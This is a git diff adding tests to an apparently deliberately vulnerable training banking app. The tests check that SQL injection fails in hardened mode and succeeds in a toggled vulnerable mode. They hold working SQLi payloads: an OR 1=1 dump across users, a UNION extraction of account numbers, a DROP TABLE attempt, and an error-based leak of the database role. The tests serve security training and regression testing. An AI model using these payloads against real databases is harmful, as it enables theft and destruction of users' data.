@@ -2,7 +2,7 @@ const request = require('supertest');
 const app = require('../../src/app');
 const { resetUsers } = require('../../src/models/users');
 const { resetAccounts } = require('../../src/models/accounts');
-const { resetSettings } = require('../../src/models/toggleState');
+const { resetSettings, updateSetting } = require('../../src/models/toggleState');
 const { extractTokenFromResponse } = require('../helpers/auth');
 
 let senderToken;
@@ -142,5 +142,155 @@ describe('GET /api/transfers', () => {
   test('rejects unauthenticated request', async () => {
     const res = await request(app).get('/api/transfers');
     expect(res.status).toBe(401);
+  });
+
+  test('filters by memo substring (case-insensitive)', async () => {
+    const res = await request(app)
+      .get('/api/transfers?memo=coffee')
+      .set('Authorization', `Bearer ${senderToken}`);
+
+    expect(res.status).toBe(200);
+    expect(res.body.transactions).toHaveLength(1);
+    expect(res.body.transactions[0].memo).toBe('Coffee reimbursement');
+  });
+
+  test('memo filter returns empty when no transaction matches', async () => {
+    const res = await request(app)
+      .get('/api/transfers?memo=nonexistent')
+      .set('Authorization', `Bearer ${senderToken}`);
+
+    expect(res.status).toBe(200);
+    expect(res.body.transactions).toHaveLength(0);
+  });
+
+  test('hardened mode treats SQLi payloads in memo as literal strings', async () => {
+    const payload = "' OR '1'='1' --";
+    const res = await request(app)
+      .get('/api/transfers?memo=' + encodeURIComponent(payload))
+      .set('Authorization', `Bearer ${senderToken}`);
+
+    expect(res.status).toBe(200);
+    expect(res.body.transactions).toHaveLength(0);
+  });
+});
+
+describe('GET /api/transfers -- vulnerable mode (SQLi)', () => {
+  beforeEach(async () => {
+    // Sender's own transaction so non-injection vulnerable searches have rows to inspect.
+    await request(app)
+      .post('/api/transfers')
+      .set('Authorization', `Bearer ${senderToken}`)
+      .send({ toAccountId: receiverAccountId, amount: 30, memo: 'Lunch' });
+
+    // Register a third user (Carol) and have her send to Receiver. This creates a
+    // transaction that does NOT involve sender's account, so cross-user dumps are
+    // observable: hardened search by sender returns 0 rows; vulnerable WHERE-escape
+    // returns Carol's transaction too.
+    const carolRes = await request(app)
+      .post('/api/auth/register')
+      .send({ username: 'carol_sqli', email: 'carol_sqli@example.com', password: 'Password123' });
+    const carolToken = extractTokenFromResponse(carolRes);
+
+    await request(app)
+      .post('/api/transfers')
+      .set('Authorization', `Bearer ${carolToken}`)
+      .send({ toAccountId: receiverAccountId, amount: 17, memo: 'CarolSecret' });
+
+    // Flip the global sql_injection toggle to TRUE. With no per-user override,
+    // COALESCE in getUserSettingByModule returns the global value for any user.
+    await updateSetting('sql_injection', true);
+  });
+
+  test("' OR '1'='1' -- dumps transactions across all users", async () => {
+    const payload = "' OR '1'='1' --";
+    const res = await request(app)
+      .get('/api/transfers?memo=' + encodeURIComponent(payload))
+      .set('Authorization', `Bearer ${senderToken}`);
+
+    expect(res.status).toBe(200);
+    expect(res.body.vulnerableMode).toBe(true);
+    const memos = res.body.transactions.map(t => t.memo);
+    expect(memos).toEqual(expect.arrayContaining(['Lunch', 'CarolSecret']));
+  });
+
+  test('UNION exfil of public_accounts surfaces account numbers in the memo slot', async () => {
+    const payload = "' UNION SELECT NULL, NULL, NULL, balance, account_number, NULL FROM public_accounts --";
+    const res = await request(app)
+      .get('/api/transfers?memo=' + encodeURIComponent(payload))
+      .set('Authorization', `Bearer ${senderToken}`);
+
+    expect(res.status).toBe(200);
+    expect(res.body.vulnerableMode).toBe(true);
+    // Fresh-registration accounts use the FAUX-XXXXXXXX format from createAccount().
+    const memos = res.body.transactions.map(t => t.memo);
+    expect(memos.some(m => typeof m === 'string' && m.startsWith('FAUX-'))).toBe(true);
+  });
+
+  test('DROP TABLE attempt is blocked at the DB layer (table intact afterward)', async () => {
+    const payload = "'; DROP TABLE transactions --";
+    const res = await request(app)
+      .get('/api/transfers?memo=' + encodeURIComponent(payload))
+      .set('Authorization', `Bearer ${senderToken}`);
+
+    expect(res.status).toBe(500);
+    expect(res.body.error.code).toBe('SEARCH_FAILED');
+
+    // Confirm the transactions table still exists by reading own history again.
+    const followUp = await request(app)
+      .get('/api/transfers')
+      .set('Authorization', `Bearer ${senderToken}`);
+    expect(followUp.status).toBe(200);
+  });
+
+  test('vulnerable response shape preserves column aliases', async () => {
+    const payload = "' OR '1'='1' --";
+    const res = await request(app)
+      .get('/api/transfers?memo=' + encodeURIComponent(payload))
+      .set('Authorization', `Bearer ${senderToken}`);
+
+    expect(res.status).toBe(200);
+    expect(res.body.vulnerableMode).toBe(true);
+    expect(res.body.transactions.length).toBeGreaterThan(0);
+    const t = res.body.transactions[0];
+    expect(t).toHaveProperty('id');
+    expect(t).toHaveProperty('fromAccountId');
+    expect(t).toHaveProperty('toAccountId');
+    expect(t).toHaveProperty('memo');
+    expect(t).toHaveProperty('reference');
+    expect(t).toHaveProperty('createdAt');
+    expect(typeof t.createdAt).toBe('string');
+    expect(Number.isNaN(Date.parse(t.createdAt))).toBe(false);
+  });
+
+  test('error-based SQLi leaks role name when verbose_errors is also on', async () => {
+    await updateSetting('verbose_errors', true);
+
+    // `CAST(... AS INT) = 1` defers the type error to runtime (the AND operand is
+    // now boolean from the equality, so the parser is happy). At runtime, the CAST
+    // evaluates and pg throws "invalid input syntax for type integer: ...role name...".
+    const payload = "' AND CAST((SELECT current_user) AS INT) = 1 --";
+    const res = await request(app)
+      .get('/api/transfers?memo=' + encodeURIComponent(payload))
+      .set('Authorization', `Bearer ${senderToken}`);
+
+    expect(res.status).toBe(500);
+    // Raw pg error includes the role name in `invalid input syntax for type integer: "fauxvault_sqli_lab"`.
+    expect(JSON.stringify(res.body)).toContain('fauxvault_sqli_lab');
+  });
+
+  test('error-based SQLi returns generic 500 when only sql_injection is on (verbose_errors off)', async () => {
+    // verbose_errors defaults to FALSE via resetSettings in the outer beforeEach;
+    // only sql_injection is flipped on by this describe block's beforeEach.
+    // `CAST(... AS INT) = 1` defers the type error to runtime (the AND operand is
+    // now boolean from the equality, so the parser is happy). At runtime, the CAST
+    // evaluates and pg throws "invalid input syntax for type integer: ...role name...".
+    const payload = "' AND CAST((SELECT current_user) AS INT) = 1 --";
+    const res = await request(app)
+      .get('/api/transfers?memo=' + encodeURIComponent(payload))
+      .set('Authorization', `Bearer ${senderToken}`);
+
+    expect(res.status).toBe(500);
+    expect(res.body.error.code).toBe('SEARCH_FAILED');
+    expect(JSON.stringify(res.body)).not.toContain('fauxvault_sqli_lab');
   });
 });
